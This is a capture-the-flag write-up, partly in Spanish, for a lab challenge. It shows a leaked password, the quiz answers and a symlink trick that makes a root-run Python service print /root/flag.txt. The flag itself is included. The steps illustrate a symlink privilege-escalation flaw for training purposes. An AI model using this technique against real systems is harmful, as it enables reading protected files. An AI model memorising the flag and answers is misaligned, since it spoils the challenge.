## Descripción
Can you abuse the banner? The server has been leaking some crucial information on `chatelaine.cylabacademy.net 30813`. Use the leaked information to get to the server.

To connect to the running application use `nc chatelaine.cylabacademy.net 17334`. From the above information abuse the machine and find the flag in the /root directory.
## Solución
```
Dark23-academy@webshell:~$ nc chatelaine.cylabacademy.net 17334
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

player@challenge:~$ cat /root/script.py

player@challenge:~$ ln -sf /root/flag.txt /home/player/banner
ln -sf /root/flag.txt /home/player/banner
player@challenge:~$ ls -la /home/player/banner
ls -la /home/player/banner
lrwxrwxrwx 1 player player 14 Oct  4 01:38 /home/player/banner -> /root/flag.txt
player@challenge:~$ exit

Dark23-academy@webshell:~$ nc chatelaine.cylabacademy.net 17334
academy{b4nn3r_gr4bb1n9_su((3sfu11y_1aa2e989}
```
## Notas Adicionales
1. **Puerto 30813** filtraba una contraseña disfrazada dentro de un banner SSH falso.
2. **Puerto 17334** corría un script Python (como root) que pedía esa contraseña + dos preguntas de verificación, y que además imprimía el contenido de `/home/player/banner` como "banner" al inicio, sin validar qué era ese archivo.
3. Al conseguir shell como `player` (gracias a `pty.spawn('su - player')` tras responder correctamente), se crea un **symlink** (`/home/player/banner` → `/root/flag.txt`).
4. Como el script se ejecuta como **root**, al reconectarte volvió a leer ese "banner" — pero ahora apuntaba a la flag protegida, y root sí tenía permiso de leerla. El script la imprimió sin querer. Eso es el "abuse del banner" del título del reto.
## Referencias
nc chatelaine.cylabacademy.net 17334